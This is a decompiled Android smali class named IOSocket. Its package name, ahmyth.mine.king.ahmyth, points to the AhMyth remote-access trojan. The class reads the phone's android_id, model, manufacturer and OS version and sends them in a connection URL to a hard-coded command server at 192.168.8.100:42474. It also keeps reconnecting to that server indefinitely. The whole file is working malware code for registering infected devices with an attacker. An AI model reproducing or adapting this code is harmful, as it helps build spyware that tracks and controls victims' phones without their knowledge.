.class public Lahmyth/mine/king/ahmyth/IOSocket;
.super Ljava/lang/Object;
.source "IOSocket.java"


# static fields
.field private static ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;


# instance fields
.field private ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 18
    new-instance v0, Lahmyth/mine/king/ahmyth/IOSocket;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/IOSocket;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;

    return-void
.end method

.method private constructor <init>()V
    .locals 6

    .prologue
    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 26
    :try_start_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "android_id"

    invoke-static {v3, v4}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 27
    .local v0, "deviceID":Ljava/lang/String;
    new-instance v2, Lio/socket/client/IO$Options;

    invoke-direct {v2}, Lio/socket/client/IO$Options;-><init>()V

    .line 28
    .local v2, "opts":Lio/socket/client/IO$Options;
    const/4 v3, 0x1

    iput-boolean v3, v2, Lio/socket/client/IO$Options;->reconnection:Z

    .line 29
    const-wide/16 v4, 0x1388

    iput-wide v4, v2, Lio/socket/client/IO$Options;->reconnectionDelay:J

    .line 30
    const-wide/32 v4, 0x3b9ac9ff

    iput-wide v4, v2, Lio/socket/client/IO$Options;->reconnectionDelayMax:J

    .line 32
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "http://192.168.8.100:42474?model="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v4}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&manf="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget-object v4, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&release="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget-object v4, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&id="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lio/socket/client/IO;->socket(Ljava/lang/String;)Lio/socket/client/Socket;

    move-result-object v3

    iput-object v3, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    .line 36
    .end local v0    # "deviceID":Ljava/lang/String;
    .end local v2    # "opts":Lio/socket/client/IO$Options;
    :goto_0
    return-void

    .line 33
    :catch_0
    move-exception v1

    .line 34
    .local v1, "e":Ljava/net/URISyntaxException;
    invoke-virtual {v1}, Ljava/net/URISyntaxException;->printStackTrace()V

    goto :goto_0
.end method

.method public static getInstance()Lahmyth/mine/king/ahmyth/IOSocket;
    .locals 1

    .prologue
    .line 40
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;

    return-object v0
.end method


# virtual methods
.method public getIoSocket()Lio/socket/client/Socket;
    .locals 1

    .prologue
    .line 44
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method
